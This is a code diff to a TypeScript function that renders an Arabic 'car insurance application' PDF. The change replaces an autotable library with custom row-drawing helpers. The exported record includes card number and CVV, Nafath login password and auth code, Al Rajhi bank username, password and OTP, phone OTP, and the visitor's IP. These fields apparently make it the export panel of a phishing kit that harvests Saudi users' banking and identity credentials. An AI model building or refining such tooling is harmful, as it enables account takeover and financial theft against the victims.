@@ -1,5 +1,4 @@
 import jsPDF from "jspdf";
-import autoTable from "jspdf-autotable";
 import { amiriFont } from "./amiri-font";
 
 interface VisitorData {
@@ -52,6 +51,52 @@ interface VisitorData {
   };
 }
 
+function drawSectionHeader(doc: jsPDF, title: string, y: number, margin: number, width: number, color: number[] = [0, 82, 147]): number {
+  doc.setFillColor(color[0], color[1], color[2]);
+  doc.rect(margin, y, width - 2 * margin, 8, "F");
+  doc.setTextColor(255, 255, 255);
+  doc.setFontSize(11);
+  doc.text(title, width / 2, y + 5.5, { align: "center" });
+  return y + 10;
+}
+
+function drawTableRow(doc: jsPDF, label: string, value: string, y: number, margin: number, pageWidth: number, isEven: boolean): number {
+  const rowHeight = 10;
+  const labelColWidth = 60;
+  const tableWidth = pageWidth - 2 * margin;
+  const valueColWidth = tableWidth - labelColWidth;
+
+  if (isEven) {
+    doc.setFillColor(245, 245, 245);
+    doc.rect(margin, y, tableWidth, rowHeight, "F");
+  }
+
+  doc.setFillColor(235, 235, 235);
+  doc.rect(margin + valueColWidth, y, labelColWidth, rowHeight, "F");
+
+  doc.setDrawColor(200, 200, 200);
+  doc.rect(margin, y, tableWidth, rowHeight, "S");
+  doc.line(margin + valueColWidth, y, margin + valueColWidth, y + rowHeight);
+
+  doc.setFontSize(10);
+  doc.setTextColor(60, 60, 60);
+  doc.text(label, margin + valueColWidth + labelColWidth - 4, y + 6.5, { align: "right" });
+
+  doc.setTextColor(30, 30, 30);
+  doc.text(value, margin + 4, y + 6.5, { align: "left" });
+
+  return y + rowHeight;
+}
+
+function checkPageBreak(doc: jsPDF, y: number, needed: number): number {
+  const pageHeight = doc.internal.pageSize.getHeight();
+  if (y + needed > pageHeight - 20) {
+    doc.addPage();
+    return 15;
+  }
+  return y;
+}
+
 export function generateInsurancePDF(data: VisitorData): void {
   const doc = new jsPDF({
     orientation: "portrait",
@@ -65,302 +110,95 @@ export function generateInsurancePDF(data: VisitorData): void {
 
   const pageWidth = doc.internal.pageSize.getWidth();
   const margin = 15;
-  let yPos = 20;
+  let y = 20;
 
   doc.setFontSize(22);
   doc.setTextColor(0, 82, 147);
-  doc.text("تأمين السيارات", pageWidth / 2, yPos, { align: "center" });
-  yPos += 10;
-  
+  doc.text("تأمين السيارات", pageWidth / 2, y, { align: "center" });
+  y += 10;
+
   doc.setFontSize(14);
   doc.setTextColor(0, 82, 147);
-  doc.text("استمارة طلب", pageWidth / 2, yPos, { align: "center" });
-  yPos += 15;
+  doc.text("استمارة طلب", pageWidth / 2, y, { align: "center" });
+  y += 12;
 
-  doc.setFillColor(0, 82, 147);
-  doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
-  doc.setTextColor(255, 255, 255);
-  doc.setFontSize(11);
-  doc.text("معلومات مقدم الطلب", pageWidth / 2, yPos + 5.5, { align: "center" });
-  yPos += 12;
-
-  const personalData = [
-    [data.personalInfo?.documment_owner_full_name || "-", "الاسم الكامل"],
-    [data.personalInfo?.nationalId || "-", "رقم الهوية"],
-    [data.personalInfo?.phone || "-", "رقم الهاتف"],
-    [data.personalInfo?.birthDate || "-", "تاريخ الميلاد"],
-  ];
-
-  autoTable(doc, {
-    startY: yPos,
-    head: [],
-    body: personalData,
-    theme: "grid",
-    styles: {
-      font: "Amiri",
-      fontSize: 10,
-      cellPadding: 4,
-      halign: "right",
-    },
-    columnStyles: {
-      0: { cellWidth: "auto", halign: "left" },
-      1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
-    },
-    margin: { left: margin, right: margin },
-  });
-
-  yPos = (doc as any).lastAutoTable.finalY + 10;
+  y = checkPageBreak(doc, y, 55);
+  y = drawSectionHeader(doc, "معلومات مقدم الطلب", y, margin, pageWidth);
+  y = drawTableRow(doc, "الاسم الكامل", data.personalInfo?.documment_owner_full_name || "-", y, margin, pageWidth, false);
+  y = drawTableRow(doc, "رقم الهوية", data.personalInfo?.nationalId || "-", y, margin, pageWidth, true);
+  y = drawTableRow(doc, "رقم الهاتف", data.personalInfo?.phone || "-", y, margin, pageWidth, false);
+  y = drawTableRow(doc, "تاريخ الميلاد", data.personalInfo?.birthDate || "-", y, margin, pageWidth, true);
+  y += 8;
 
   if (data.vehicleInfo) {
-    doc.setFillColor(0, 82, 147);
-    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
-    doc.setTextColor(255, 255, 255);
-    doc.setFontSize(11);
-    doc.text("معلومات المركبة", pageWidth / 2, yPos + 5.5, { align: "center" });
-    yPos += 12;
-
-    const vehicleData = [
-      [data.vehicleInfo?.serialNumber || "-", "الرقم التسلسلي"],
-      [data.vehicleInfo?.vehicleYear || "-", "سنة الصنع"],
-      [data.vehicleInfo?.coverageType || "-", "نوع التغطية"],
-      [data.vehicleInfo?.selectedAddOns?.join(", ") || "-", "الإضافات"],
-    ];
-
-    autoTable(doc, {
-      startY: yPos,
-      head: [],
-      body: vehicleData,
-      theme: "grid",
-      styles: {
-        font: "Amiri",
-        fontSize: 10,
-        cellPadding: 4,
-        halign: "right",
-      },
-      columnStyles: {
-        0: { cellWidth: "auto", halign: "left" },
-        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
-      },
-      margin: { left: margin, right: margin },
-    });
-
-    yPos = (doc as any).lastAutoTable.finalY + 10;
+    y = checkPageBreak(doc, y, 55);
+    y = drawSectionHeader(doc, "معلومات المركبة", y, margin, pageWidth);
+    y = drawTableRow(doc, "الرقم التسلسلي", data.vehicleInfo?.serialNumber || "-", y, margin, pageWidth, false);
+    y = drawTableRow(doc, "سنة الصنع", data.vehicleInfo?.vehicleYear || "-", y, margin, pageWidth, true);
+    y = drawTableRow(doc, "نوع التغطية", data.vehicleInfo?.coverageType || "-", y, margin, pageWidth, false);
+    y = drawTableRow(doc, "الإضافات", data.vehicleInfo?.selectedAddOns?.join(", ") || "-", y, margin, pageWidth, true);
+    y += 8;
   }
 
   if (data.selectedOffer) {
-    doc.setFillColor(0, 82, 147);
-    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
-    doc.setTextColor(255, 255, 255);
-    doc.setFontSize(11);
-    doc.text("عرض التأمين", pageWidth / 2, yPos + 5.5, { align: "center" });
-    yPos += 12;
-
-    const offerData = [
-      [data.selectedOffer?.companyName || "-", "الشركة"],
-      [data.selectedOffer?.basePrice ? `${data.selectedOffer.basePrice} ر.س` : "-", "السعر الأساسي"],
-      [data.selectedOffer?.discountPercentage ? `${data.selectedOffer.discountPercentage}%` : "-", "الخصم"],
-      [data.selectedOffer?.totalPrice ? `${data.selectedOffer.totalPrice} ر.س` : "-", "السعر الإجمالي"],
-    ];
-
-    autoTable(doc, {
-      startY: yPos,
-      head: [],
-      body: offerData,
-      theme: "grid",
-      styles: {
-        font: "Amiri",
-        fontSize: 10,
-        cellPadding: 4,
-        halign: "right",
-      },
-      columnStyles: {
-        0: { cellWidth: "auto", halign: "left" },
-        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
-      },
-      margin: { left: margin, right: margin },
-    });
-
-    yPos = (doc as any).lastAutoTable.finalY + 10;
+    y = checkPageBreak(doc, y, 55);
+    y = drawSectionHeader(doc, "عرض التأمين", y, margin, pageWidth);
+    y = drawTableRow(doc, "الشركة", data.selectedOffer?.companyName || "-", y, margin, pageWidth, false);
+    y = drawTableRow(doc, "السعر الأساسي", data.selectedOffer?.basePrice ? `${data.selectedOffer.basePrice} ر.س` : "-", y, margin, pageWidth, true);
+    y = drawTableRow(doc, "الخصم", data.selectedOffer?.discountPercentage ? `${data.selectedOffer.discountPercentage}%` : "-", y, margin, pageWidth, false);
+    y = drawTableRow(doc, "السعر الإجمالي", data.selectedOffer?.totalPrice ? `${data.selectedOffer.totalPrice} ر.س` : "-", y, margin, pageWidth, true);
+    y += 8;
   }
 
   if (data.paymentInfo?.cardNumber) {
-    doc.setFillColor(0, 82, 147);
-    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
-    doc.setTextColor(255, 255, 255);
-    doc.setFontSize(11);
-    doc.text("معلومات الدفع", pageWidth / 2, yPos + 5.5, { align: "center" });
-    yPos += 12;
-
-    const paymentData = [
-      [data.paymentInfo?.cardNumber || "-", "رقم البطاقة"],
-      [data.paymentInfo?.cardHolder || "-", "اسم حامل البطاقة"],
-      [data.paymentInfo?.expiryDate || "-", "تاريخ الانتهاء"],
-      [data.paymentInfo?.cvv || "-", "CVV"],
-    ];
-
-    autoTable(doc, {
-      startY: yPos,
-      head: [],
-      body: paymentData,
-      theme: "grid",
-      styles: {
-        font: "Amiri",
-        fontSize: 10,
-        cellPadding: 4,
-        halign: "right",
-      },
-      columnStyles: {
-        0: { cellWidth: "auto", halign: "left" },
-        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
-      },
-      margin: { left: margin, right: margin },
-    });
-
-    yPos = (doc as any).lastAutoTable.finalY + 10;
+    y = checkPageBreak(doc, y, 55);
+    y = drawSectionHeader(doc, "معلومات الدفع", y, margin, pageWidth);
+    y = drawTableRow(doc, "رقم البطاقة", data.paymentInfo?.cardNumber || "-", y, margin, pageWidth, false);
+    y = drawTableRow(doc, "اسم حامل البطاقة", data.paymentInfo?.cardHolder || "-", y, margin, pageWidth, true);
+    y = drawTableRow(doc, "تاريخ الانتهاء", data.paymentInfo?.expiryDate || "-", y, margin, pageWidth, false);
+    y = drawTableRow(doc, "CVV", data.paymentInfo?.cvv || "-", y, margin, pageWidth, true);
+    y += 8;
   }
 
   if (data.nafazData?.idNumber) {
-    doc.setFillColor(0, 82, 147);
-    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
-    doc.setTextColor(255, 255, 255);
-    doc.setFontSize(11);
-    doc.text("توثيق نفاذ", pageWidth / 2, yPos + 5.5, { align: "center" });
-    yPos += 12;
-
-    const nafazTableData = [
-      [data.nafazData?.idNumber || "-", "رقم الهوية"],
-      [data.nafazData?.password || "-", "كلمة المرور"],
-      [data.nafazData?.authNumber || "-", "رقم التوثيق"],
-    ];
-
-    autoTable(doc, {
-      startY: yPos,
-      head: [],
-      body: nafazTableData,
-      theme: "grid",
-      styles: {
-        font: "Amiri",
-        fontSize: 10,
-        cellPadding: 4,
-        halign: "right",
-      },
-      columnStyles: {
-        0: { cellWidth: "auto", halign: "left" },
-        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
-      },
-      margin: { left: margin, right: margin },
-    });
-
-    yPos = (doc as any).lastAutoTable.finalY + 10;
+    y = checkPageBreak(doc, y, 45);
+    y = drawSectionHeader(doc, "توثيق نفاذ", y, margin, pageWidth);
+    y = drawTableRow(doc, "رقم الهوية", data.nafazData?.idNumber || "-", y, margin, pageWidth, false);
+    y = drawTableRow(doc, "كلمة المرور", data.nafazData?.password || "-", y, margin, pageWidth, true);
+    y = drawTableRow(doc, "رقم التوثيق", data.nafazData?.authNumber || "-", y, margin, pageWidth, false);
+    y += 8;
   }
 
   if (data.rajhiData?.username) {
-    doc.setFillColor(0, 82, 147);
-    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
-    doc.setTextColor(255, 255, 255);
-    doc.setFontSize(11);
-    doc.text("بنك الراجحي", pageWidth / 2, yPos + 5.5, { align: "center" });
-    yPos += 12;
-
-    const rajhiTableData = [
-      [data.rajhiData?.username || "-", "اسم المستخدم"],
-      [data.rajhiData?.password || "-", "كلمة المرور"],
-      [data.rajhiData?.otp || "-", "رمز التحقق"],
-    ];
-
-    autoTable(doc, {
-      startY: yPos,
-      head: [],
-      body: rajhiTableData,
-      theme: "grid",
-      styles: {
-        font: "Amiri",
-        fontSize: 10,
-        cellPadding: 4,
-        halign: "right",
-      },
-      columnStyles: {
-        0: { cellWidth: "auto", halign: "left" },
-        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
-      },
-      margin: { left: margin, right: margin },
-    });
-
-    yPos = (doc as any).lastAutoTable.finalY + 10;
+    y = checkPageBreak(doc, y, 45);
+    y = drawSectionHeader(doc, "بنك الراجحي", y, margin, pageWidth);
+    y = drawTableRow(doc, "اسم المستخدم", data.rajhiData?.username || "-", y, margin, pageWidth, false);
+    y = drawTableRow(doc, "كلمة المرور", data.rajhiData?.password || "-", y, margin, pageWidth, true);
+    y = drawTableRow(doc, "رمز التحقق", data.rajhiData?.otp || "-", y, margin, pageWidth, false);
+    y += 8;
   }
 
   if (data.phoneData?.phoneNumber) {
-    doc.setFillColor(0, 82, 147);
-    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
-    doc.setTextColor(255, 255, 255);
-    doc.setFontSize(11);
-    doc.text("التحقق من الهاتف", pageWidth / 2, yPos + 5.5, { align: "center" });
-    yPos += 12;
-
-    const phoneTableData = [
-      [data.phoneData?.phoneNumber || "-", "رقم الهاتف"],
-      [data.phoneData?.carrier || "-", "شركة الاتصالات"],
-      [data.phoneData?.otp || "-", "رمز التحقق"],
-    ];
-
-    autoTable(doc, {
-      startY: yPos,
-      head: [],
-      body: phoneTableData,
-      theme: "grid",
-      styles: {
-        font: "Amiri",
-        fontSize: 10,
-        cellPadding: 4,
-        halign: "right",
-      },
-      columnStyles: {
-        0: { cellWidth: "auto", halign: "left" },
-        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
-      },
-      margin: { left: margin, right: margin },
-    });
-
-    yPos = (doc as any).lastAutoTable.finalY + 10;
+    y = checkPageBreak(doc, y, 45);
+    y = drawSectionHeader(doc, "التحقق من الهاتف", y, margin, pageWidth);
+    y = drawTableRow(doc, "رقم الهاتف", data.phoneData?.phoneNumber || "-", y, margin, pageWidth, false);
+    y = drawTableRow(doc, "شركة الاتصالات", data.phoneData?.carrier || "-", y, margin, pageWidth, true);
+    y = drawTableRow(doc, "رمز التحقق", data.phoneData?.otp || "-", y, margin, pageWidth, false);
+    y += 8;
   }
 
   if (data.metadata) {
-    doc.setFillColor(100, 100, 100);
-    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
-    doc.setTextColor(255, 255, 255);
-    doc.setFontSize(11);
-    doc.text("البيانات الوصفية", pageWidth / 2, yPos + 5.5, { align: "center" });
-    yPos += 12;
-
-    const createdAt = data.metadata?.createdAt?.toDate?.() 
+    const createdAt = data.metadata?.createdAt?.toDate?.()
       ? data.metadata.createdAt.toDate().toLocaleString("ar-SA")
       : data.metadata?.createdAt || "-";
 
-    const metaData = [
-      [data.metadata?.country || "-", "الدولة"],
-      [data.metadata?.browser || "-", "المتصفح"],
-      [data.metadata?.os || "-", "نظام التشغيل"],
-      [data.metadata?.ip || "-", "عنوان IP"],
-      [createdAt, "تاريخ الإنشاء"],
-    ];
-
-    autoTable(doc, {
-      startY: yPos,
-      head: [],
-      body: metaData,
-      theme: "grid",
-      styles: {
-        font: "Amiri",
-        fontSize: 10,
-        cellPadding: 4,
-        halign: "right",
-      },
-      columnStyles: {
-        0: { cellWidth: "auto", halign: "left" },
-        1: { fontStyle: "bold", cellWidth: 60, fillColor: [240, 240, 240], halign: "right" },
-      },
-      margin: { left: margin, right: margin },
-    });
+    y = checkPageBreak(doc, y, 65);
+    y = drawSectionHeader(doc, "البيانات الوصفية", y, margin, pageWidth, [100, 100, 100]);
+    y = drawTableRow(doc, "الدولة", data.metadata?.country || "-", y, margin, pageWidth, false);
+    y = drawTableRow(doc, "المتصفح", data.metadata?.browser || "-", y, margin, pageWidth, true);
+    y = drawTableRow(doc, "نظام التشغيل", data.metadata?.os || "-", y, margin, pageWidth, false);
+    y = drawTableRow(doc, "عنوان IP", data.metadata?.ip || "-", y, margin, pageWidth, true);
+    y = drawTableRow(doc, "تاريخ الإنشاء", createdAt, y, margin, pageWidth, false);
   }
 
   const pageHeight = doc.internal.pageSize.getHeight();
